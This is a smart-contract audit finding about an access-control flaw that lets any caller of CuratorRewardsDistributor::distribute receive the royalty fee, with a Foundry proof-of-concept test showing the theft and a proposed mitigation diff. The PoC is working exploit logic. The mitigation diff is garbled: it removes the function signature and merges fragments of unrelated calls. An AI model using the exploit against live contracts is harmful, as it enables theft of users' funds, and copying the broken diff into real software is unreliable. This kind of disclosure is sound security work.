# Vulnerability details

## Impact
In function `CuratorRewardsDistributor::distribute` there is reward distribution for proper users, but there is also calculated `royaltyFee` and it is sent to `_msgSender()`. Currently everyone can call this function so royalty fee can be stolen.

## Proof of Concept
Copy this test to `CuratorRewardsDistributor.t.sol`
```solidity
    function test_anyoneCanDistribute() public {
        uint256 credId = 1;
        uint256 depositAmount = 1 ether;

        // Deposit some ETH to the curatorRewardsDistributor
        curatorRewardsDistributor.deposit{ value: depositAmount }(credId, depositAmount);

        // Signal creds for different users
        vm.startPrank(user1);
        vm.deal(user1, bondingCurve.getBuyPriceAfterFee(credId, 1, 1));
        cred.buyShareCred{ value: bondingCurve.getBuyPriceAfterFee(credId, 1, 1) }(credId, 1, 0);
        vm.stopPrank();

        vm.startPrank(user2);
        vm.deal(user2, bondingCurve.getBuyPriceAfterFee(credId, 2, 2));
        cred.buyShareCred{ value: bondingCurve.getBuyPriceAfterFee(credId, 2, 2) }(credId, 2, 0);
        vm.stopPrank();

        address randomUser = makeAddr("randomUser");
        uint256 startingRandomUserBalance = randomUser.balance;

        // Distribute rewards
        vm.prank(randomUser);
        curatorRewardsDistributor.distribute(credId);

        assertEq(startingRandomUserBalance, 0);
        assert(randomUser.balance > 0); // randomUser was able to get royalty fees
    }
```
and run `forge test --mt test_anyoneCanDistribute`
The test will pass. It means balance of random user is greater than 0 and he was able to steal `royaltyFee`

## Recommended Mitigation Steps
Add proper access modifier to `CuratorRewardsDistributor::distribute`
```diff

-    function distribute(uint256 credId) external {

        uint256 distributeAmount = totalBalance - royaltyfee;

        // actualDistributeAmount is used to avoid rounding errors
        // amount[0] = 333 333 333 333 333 333
        // amount[1] = 333 333 333 333 333 333
        // amount[2] = 333 333 333 333 333 333
        uint256 actualDistributeAmount = 0;
        for (uint256 i = 0; i < distributeAddresses.length; i++) {
            address user = distributeAddresses[i];

            uint256 userAmounts = credContract.getShareNumber(credId, user);
            uint256 userRewards = (distributeAmount * userAmounts) / totalNum;

            if (userRewards > 0) {
                amounts[i] = userRewards;
                actualDistributeAmount += userRewards;
            }

        phiRewardsContract.depositBatch{ value: actualDistributeAmount }(
            distributeAddresses, amounts, reasons, "deposit from curator rewards distributor"

            credId, _msgSender(), royaltyfee + distributeAmount - actualDistributeAmount, distributeAmount, totalBalance
        );
    }
```
